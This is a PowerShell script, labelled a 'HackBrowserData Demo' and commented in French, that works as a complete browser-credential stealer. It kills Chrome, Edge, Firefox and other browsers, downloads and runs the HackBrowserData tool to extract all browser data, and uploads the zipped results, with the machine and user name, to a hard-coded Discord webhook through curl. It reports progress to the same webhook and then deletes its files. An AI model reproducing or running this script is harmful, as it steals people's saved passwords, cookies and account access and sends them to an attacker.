# HackBrowserData Demo - Version finale
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Fonction Discord sécurisée
function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - PC: $env:COMPUTERNAME | User: $env:USERNAME"

# Tuer les navigateurs
@("chrome","msedge","firefox","brave","opera","vivaldi") | ForEach-Object {
    Get-Process -Name $_ -EA 0 | Stop-Process -Force -EA 0
}

Start-Sleep 5

# Nettoyer TEMP
Set-Location $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-Discord "📥 **Downloading tool...**"

try {
    # Télécharger
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip"
    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
    
    if (!(Test-Path "hbd.zip")) {
        Send-Discord "❌ **Download failed**"
        exit
    }
    
    Send-Discord "📦 **Extracting...**"
    
    # Extraire
    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
    Set-Location "HBD"
    
    if (!(Test-Path "hack-browser-data.exe")) {
        Send-Discord "❌ **EXE not found**"
        exit
    }
    
    Send-Discord "🔓 **Extracting browser data...**"
    
    # Exécuter
    Start-Process -FilePath ".\hack-browser-data.exe" -ArgumentList "--browser all --format json --dir output --zip" -Wait -NoNewWindow
    
    Start-Sleep 3
    
    # Vérifier résultat
    if (Test-Path "results.zip") {
        $size = [math]::Round((Get-Item "results.zip").Length / 1KB, 2)
        Send-Discord "📤 **Uploading $size KB...**"
        
        # Upload
        $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        curl.exe -F "file=@results.zip" -F "content=✅ **EXTRACTED DATA**`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        
        Send-Discord "✅ **Upload SUCCESS**"
    }
    elseif (Test-Path "output") {
        Send-Discord "⚠️ **No results.zip, trying manual compress...**"
        
        Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
        
        if (Test-Path "manual.zip") {
            curl.exe -F "file=@manual.zip" -F "content=📁 **Manual backup from $env:COMPUTERNAME**" $wh
            Send-Discord "✅ **Manual upload done**"
        }
    }
    else {
        Send-Discord "❌ **No output folder found**"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'" -replace '\n',' '
    Send-Discord "❌ **Error:** $err"
}

# Cleanup
Set-Location ..
Start-Sleep 2
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

Send-Discord "🧹 **FINISHED**"
